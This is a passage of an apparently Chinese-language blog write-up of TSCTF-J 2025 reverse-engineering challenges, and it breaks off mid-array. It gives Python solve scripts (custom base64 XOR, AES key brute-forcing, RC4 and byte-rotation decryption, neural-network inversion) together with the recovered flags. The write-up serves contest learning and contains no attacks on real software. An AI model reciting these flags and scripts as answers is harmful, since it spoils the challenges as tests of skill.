class="built_in">tuple</span>(size)</span><br><span class="line">    stride = <span class="built_in">tuple</span>(stride)</span><br><span class="line">    base = storage_obj.array</span><br><span class="line">    off = storage_offset</span><br><span class="line">    count = <span class="built_in">int</span>(np.prod(size, dtype=<span class="built_in">int</span>))</span><br><span class="line">    <span class="keyword">if</span> stride == default_stride(size):</span><br><span class="line">        arr = base[off:off + count].reshape(size).copy()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte_strides = <span class="built_in">tuple</span>(s * base.dtype.itemsize <span class="keyword">for</span> s <span class="keyword">in</span> stride)</span><br><span class="line">        arr = np.lib.stride_tricks.as_strided(base[off:], shape=size, strides=byte_strides).copy()</span><br><span class="line">    <span class="keyword">return</span> TensorWrapper(arr)</span><br><span class="line"></span><br><span class="line">utils._rebuild_tensor_v2 = _rebuild_tensor_v2</span><br><span class="line"></span><br><span class="line">storages = &#123;&#125;</span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;model.pth&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">persistent_load</span>(<span class="params">self, pid</span>):</span><br><span class="line">        kind, _, key, _, _ = pid</span><br><span class="line">        <span class="keyword">if</span> kind != <span class="string">&#x27;storage&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;unexpected persistent object&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> storages:</span><br><span class="line">            raw = zf.read(<span class="string">f&#x27;model/data/<span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line">            arr = np.frombuffer(raw, dtype=<span class="string">&#x27;&lt;f4&#x27;</span>).copy()</span><br><span class="line">            storages[key] = StorageWrapper(arr)</span><br><span class="line">        <span class="keyword">return</span> storages[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zf.<span class="built_in">open</span>(<span class="string">&#x27;model/data.pkl&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    state_dict = MyUnpickler(io.BytesIO(f.read())).load()</span><br><span class="line"></span><br><span class="line">params = &#123;k: v.array <span class="keyword">for</span> k, v <span class="keyword">in</span> state_dict.items()&#125;</span><br><span class="line">conv1_w = params[<span class="string">&#x27;conv1.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">conv1_b = params[<span class="string">&#x27;conv1.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">conv2_w = params[<span class="string">&#x27;conv2.weight&#x27;</span>][<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">conv2_b = params[<span class="string">&#x27;conv2.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">linear_w = params[<span class="string">&#x27;linear.weight&#x27;</span>]</span><br><span class="line">linear_b = params[<span class="string">&#x27;linear.bias&#x27;</span>]</span><br><span class="line">conv3_b = params[<span class="string">&#x27;conv3.bias&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">grid = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            grid.append([<span class="built_in">float</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> line.split()])</span><br><span class="line">Y = np.array(grid, dtype=np.float64)</span><br><span class="line">n = Y.shape[<span class="number">0</span>] - <span class="number">1</span>  <span class="comment"># 59 -&gt; n=58</span></span><br><span class="line"></span><br><span class="line">A = np.zeros((n, n), dtype=np.float64)</span><br><span class="line">Yp = Y - conv3_b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        val = Yp[i, j]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">6</span> * A[i - <span class="number">1</span>, j - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">2</span> * A[i - <span class="number">1</span>, j]</span><br><span class="line">        <span class="keyword">if</span> j &gt; <span class="number">0</span>:</span><br><span class="line">            val -= <span class="number">3</span> * A[i, j - <span class="number">1</span>]</span><br><span class="line">        A[i, j] = val / <span class="number">9.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反线性</span></span><br><span class="line">v = A.reshape(-<span class="number">1</span>)</span><br><span class="line">rhs = v - linear_b</span><br><span class="line">u, *_ = np.linalg.lstsq(linear_w, rhs, rcond=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">bias = conv2_w * conv1_b + conv2_b</span><br><span class="line">bits = np.zeros(<span class="number">4</span> * n, dtype=<span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    val = <span class="built_in">int</span>(<span class="built_in">round</span>((u[j] - bias) / conv2_w))</span><br><span class="line">    val = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">15</span>, val))</span><br><span class="line">    b0, b1, b2, b3 = val &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>, (val &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span></span><br><span class="line">    bits[<span class="number">2</span> * j] = b0</span><br><span class="line">    bits[<span class="number">2</span> * j + <span class="number">1</span>] = b1</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j] = b2</span><br><span class="line">    bits[<span class="number">2</span> * n + <span class="number">2</span> * j + <span class="number">1</span>] = b3</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 输出flag</span></span><br><span class="line">chars = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, bits.size, <span class="number">8</span>):</span><br><span class="line">    byte = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bits[k:k + <span class="number">8</span>]:</span><br><span class="line">        byte = (byte &lt;&lt; <span class="number">1</span>) | bit</span><br><span class="line">    chars.append(<span class="built_in">chr</span>(byte))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(chars))</span><br></pre></td></tr></table></figure><p>TSCTF-J{NotReverseButInverse}</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>这部分的话，主要第二天没时间做，又不想熬夜，最后pyd应该是有了大概的方向，xxtea，魔改了delta? 轮数可能不太一样,还需要动调，没时间做了，主要那个scratch3做了五个小时(纯属我眼瞎了)…</p><h3 id="Singin"><a href="#Singin" class="headerlink" title="Singin"></a>Singin</h3><p>逻辑很清晰，有个换表base64</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111123283.png" alt="image-20251013111123283"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111219947.png" alt="image-20251013111219947"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013111527189.png" alt="image-20251013111527189"></p><p>通过确定性置换对Base64字母表进行打乱</p><p>签到题，值得注意的有一个字节是重合的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">permute_alphabet</span>(<span class="params">alphabet</span>):</span><br><span class="line">    alphabet = <span class="built_in">list</span>(alphabet)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        swap_idx = (<span class="number">7</span> * idx + <span class="number">5</span>) % <span class="number">64</span></span><br><span class="line">        alphabet[idx], alphabet[swap_idx] = alphabet[swap_idx], alphabet[idx]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(alphabet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64</span>(<span class="params">plain, alphabet</span>):</span><br><span class="line">    encoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    bit_buffer = <span class="number">0</span></span><br><span class="line">    bits_remaining = -<span class="number">6</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> plain:</span><br><span class="line">        bit_buffer = (bit_buffer &lt;&lt; <span class="number">8</span>) + byte</span><br><span class="line">        bits_remaining += <span class="number">8</span></span><br><span class="line">        <span class="keyword">while</span> bits_remaining &gt;= <span class="number">0</span>:</span><br><span class="line">            index = (bit_buffer &gt;&gt; bits_remaining) &amp; <span class="number">0x3F</span></span><br><span class="line">            encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">            bits_remaining -= <span class="number">6</span></span><br><span class="line">    <span class="keyword">if</span> bits_remaining &gt;= -<span class="number">5</span>:</span><br><span class="line">        index = (bit_buffer &lt;&lt; <span class="number">8</span> &gt;&gt; (bits_remaining + <span class="number">8</span>)) &amp; <span class="number">0x3F</span></span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(alphabet[index]))</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(encoded) % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        encoded.append(<span class="built_in">ord</span>(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(encoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_target</span>():</span><br><span class="line">    buf = <span class="built_in">bytearray</span>(<span class="number">40</span>)</span><br><span class="line">    buf[<span class="number">0</span>:<span class="number">8</span>] = (<span class="number">0x3D13023261347C23</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">8</span>:<span class="number">16</span>] = (<span class="number">0x143402370D641267</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    buf[<span class="number">15</span>:<span class="number">23</span>] = (<span class="number">0x347024692B7A0314</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>) <span class="comment"># 坑在这里哦</span></span><br><span class="line">    buf[<span class="number">23</span>:<span class="number">31</span>] = (<span class="number">0x284202766B703261</span>).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(buf[:<span class="number">31</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    alphabet = permute_alphabet(<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)</span><br><span class="line">    keystream = custom_base64(<span class="string">b&quot;WelcomeToTSCTF&quot;</span>, alphabet)</span><br><span class="line">    target = build_target()</span><br><span class="line">    repeat = (keystream * ((<span class="built_in">len</span>(target) + <span class="built_in">len</span>(keystream) - <span class="number">1</span>) // <span class="built_in">len</span>(keystream)))[:<span class="built_in">len</span>(target)]</span><br><span class="line">    flag = <span class="built_in">bytes</span>(k ^ t <span class="keyword">for</span> k, t <span class="keyword">in</span> <span class="built_in">zip</span>(repeat, target))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{We1c@me_t0_TS_CTF_2025}</p><h3 id="CryDancing"><a href="#CryDancing" class="headerlink" title="CryDancing"></a>CryDancing</h3><p>ios逆向</p><p>解压到本地IDA打开</p><p>objective</p><p>AES加密，挺清晰的</p><p>会把输入框里的字符串，做 AES-128-CBC 加密并转成 Base64，再与内置串比较决定弹窗内容。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113221461.png" alt="image-20251013113221461"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013113320124.png" alt="image-20251013113320124"></p><p>枚举 “ABCDEFGHIJKLMNOPQRSTUVWXYZ” 的所有 4 位组合，找到 MD5 为 674040176a34f6c994003fe85badfc48 的候选，结果是 NOTD。</p><p><img src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013114030136.png" alt="image-20251013114030136"></p><p>加密时把 NOTD 重复四次得到 16 字节密钥，IV 为 0x00000177（小端存放在首 4 字节）其余补 0，共 16 字节；AES-128-CBC + PKCS#7 padding。</p><p>CCCrypt就是AES哦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line">TARGET_MD5 = <span class="string">&quot;674040176a34f6c994003fe85badfc48&quot;</span></span><br><span class="line">ALPHABET = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">CIPHERTEXT_B64 = <span class="string">&quot;bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key_fragment</span>():</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> product(ALPHABET, repeat=<span class="number">4</span>):</span><br><span class="line">        candidate = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(candidate.encode()).hexdigest() == TARGET_MD5:</span><br><span class="line">            <span class="keyword">return</span> candidate</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">cipher_b64, key_fragment</span>):</span><br><span class="line">    full_key = (key_fragment * <span class="number">4</span>).encode()</span><br><span class="line">    iv = <span class="built_in">bytes</span>([<span class="number">0x77</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>] + [<span class="number">0x00</span>] * <span class="number">12</span>)</span><br><span class="line">    cipher_bytes = b64decode(cipher_b64)</span><br><span class="line">    cipher = AES.new(full_key, AES.MODE_CBC, iv)</span><br><span class="line">    plain = unpad(cipher.decrypt(cipher_bytes), AES.block_size)</span><br><span class="line">    <span class="keyword">return</span> plain.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key_fragment = derive_key_fragment()</span><br><span class="line">    flag = decrypt_flag(CIPHERTEXT_B64, key_fragment)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;key: <span class="subst">&#123;key_fragment&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</p><h3 id="听绿的秘密"><a href="#听绿的秘密" class="headerlink" title="听绿的秘密"></a>听绿的秘密</h3><p>对图像进行了加密，Secret.obf明显是混淆过了，看了下loader确认加密</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150828847.png" alt="image-20251011150828847"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.obf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obf_bytes = f.read()</span><br><span class="line"></span><br><span class="line">class_bytes = <span class="built_in">bytes</span>((b - <span class="number">7</span>) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> b <span class="keyword">in</span> obf_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Secret.class&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(class_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011150940318.png" alt="image-20251011150940318"></p><p>再写逆向算法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">value, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | ((value &lt;&lt; (<span class="number">8</span> - shift)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">input_path, output_path</span>) :</span><br><span class="line">    data = <span class="built_in">bytearray</span>(input_path.read_bytes())</span><br><span class="line"></span><br><span class="line">    state = <span class="number">123</span></span><br><span class="line">    <span class="keyword">for</span> index, cipher <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        rotation = (index + state) % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> rotation == <span class="number">0</span>:</span><br><span class="line">            transformed = cipher</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            transformed = rotate_right(cipher, rotation)</span><br><span class="line">        plain = (transformed - ((index % <span class="number">251</span>) + state)) &amp; <span class="number">0xFF</span></span><br><span class="line">        data[index] = plain</span><br><span class="line">        state = (state + cipher + <span class="number">37</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    output_path.write_bytes(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_path = Path(<span class="string">&quot;Where_is_my_cat.png&quot;</span>)</span><br><span class="line">    output_path = Path(<span class="string">&quot;Cat_decrypted3.png&quot;</span>)</span><br><span class="line">    decrypt(input_path, output_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151224682.png" alt="image-20251011151224682"></p><h3 id="Handler’s-Whisper"><a href="#Handler’s-Whisper" class="headerlink" title="Handler’s Whisper"></a>Handler’s Whisper</h3><p>看着没啥问题，其实会有个除0异常</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151700663.png" alt="image-20251011151700663"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151754527.png" alt="image-20251011151754527"></p><p>之后就是RC4解密了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011151838075.png" alt="image-20251011151838075"></p><p>注意然后对每个字节执行位重排：((c &amp; 0x03) &lt;&lt; 6) | ((c &amp; 0x0C) &lt;&lt; 2) | ((c &amp; 0xF0) &gt;&gt; 4)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x74</span>, <span class="number">0x6d</span>, <span class="number">0x32</span>, <span class="number">0x18</span>, <span class="number">0x70</span>, <span class="number">0x1e</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x3c</span>, <span class="number">0xdc</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xa6</span>, <span class="number">0x3a</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0xe3</span>, <span class="number">0x69</span>, <span class="number">0x41</span>, <span class="number">0xb9</span>, <span class="number">0xa2</span>, <span class="number">0x2f</span>, <span class="number">0xcd</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xea</span>, <span class="number">0x1d</span>, <span class="number">0x80</span>, <span class="number">0x70</span>, <span class="number">0xfc</span>, <span class="number">0x58</span>, <span class="number">0xe4</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xf0</span>, <span class="number">0x92</span>, <span class="number">0xcf</span>, <span class="number">0xe2</span>, <span class="number">0x37</span></span><br><span class="line">])</span><br><span class="line">KEY = <span class="string">b&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_permute</span>(<span class="params">byte_val</span>):</span><br><span class="line">    <span class="keyword">return</span> ((byte_val &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (((byte_val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">2</span>) | ((byte_val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">key, count</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + s[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        <span class="keyword">yield</span> s[(s[i] + s[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    stream = rc4_keystream(KEY, <span class="built_in">len</span>(enc))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(((inv_permute(b) - k) &amp; <span class="number">0xFF</span>) ^ <span class="number">0x44</span> <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(enc, stream))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decrypt().decode())</span><br></pre></td></tr></table></figure><p>TSCTF-J{SEH_C@11b@ck_sp3@k$_w!th_RC4!}</p><h3 id="哭泣之子"><a href="#哭泣之子" class="headerlink" title="哭泣之子"></a>哭泣之子</h3><p>这个卡了挺久 我还以为是misc呢…… 看了眼瞎过了一遍没看到主逻辑，直接去看解码器了，后面看了下各个脚本的修改时间不大对，都是好几年前的，逻辑肯定在Cryingchild.dll里</p><p>exe没有主逻辑，主逻辑托管给了Cringchild.dll</p><p>Crying.dll中</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152548879.png" alt="image-20251011152548879"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152617413.png" alt="image-20251011152617413"></p><p>追这个WaveOutEvent</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011152500623.png" alt="image-20251011152500623"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array3 = [</span><br><span class="line">    <span class="number">871</span>, <span class="number">1654</span>, <span class="number">789</span>, <span class="number">1617</span>, <span class="number">1221</span>, <span class="number">2173</span>, <span class="number">871</span>, <span class="number">1724</span>, <span class="number">629</span>, <span class="number">1111</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1664</span>, <span class="number">783</span>, <span class="number">1579</span>, <span class="number">989</span>, <span class="number">1633</span>, <span class="number">1229</span>, <span class="number">2148</span>, <span class="number">891</span>, <span class="number">1703</span>,</span><br><span class="line">    <span class="number">1237</span>, <span class="number">2249</span>, <span class="number">1229</span>, <span class="number">2161</span>, <span class="number">1157</span>, <span class="number">2095</span>, <span class="number">1237</span>, <span class="number">2201</span>, <span class="number">1243</span>, <span class="number">2166</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1604</span>, <span class="number">941</span>, <span class="number">1669</span>, <span class="number">813</span>, <span class="number">1651</span>, <span class="number">845</span>, <span 